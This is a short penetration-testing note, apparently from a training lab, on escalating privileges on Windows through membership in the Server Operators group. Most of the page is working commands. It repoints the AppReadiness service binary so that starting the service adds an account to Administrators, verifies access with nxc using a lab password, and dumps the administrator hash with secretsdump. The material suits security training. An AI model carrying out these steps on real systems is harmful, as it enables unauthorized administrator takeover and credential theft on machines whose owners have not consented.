# Server Operators

Membership of this group confers the powerful **SeBackupPrivilege** and **SeRestorePrivilege** privileges and the ability to control local services.

## Querying the AppReadiness Service

```
sc qc AppReadiness
```

<figure><img src="../../../.gitbook/assets/Server Operators.png" alt=""><figcaption></figcaption></figure>

We can use the service viewer/controller **PsService**, which is part of the Sysinternals suite, to check permissions on the service. PsService works much like the sc utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

```
PsService.exe security AppReadiness
```

This confirms that the Server Operators group has SERVICE\_ALL\_ACCESS access right, which gives us full control over this service.

### Modify the service binary path

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Now start the service and it will fail:

```
sc start AppReadiness
```

Check administrators group:&#x20;

```
net localgroup Administrators
```

&#x20;our account will be added.

Check admin privilege with nxc:

```
nxc smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

Get hashes:

```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
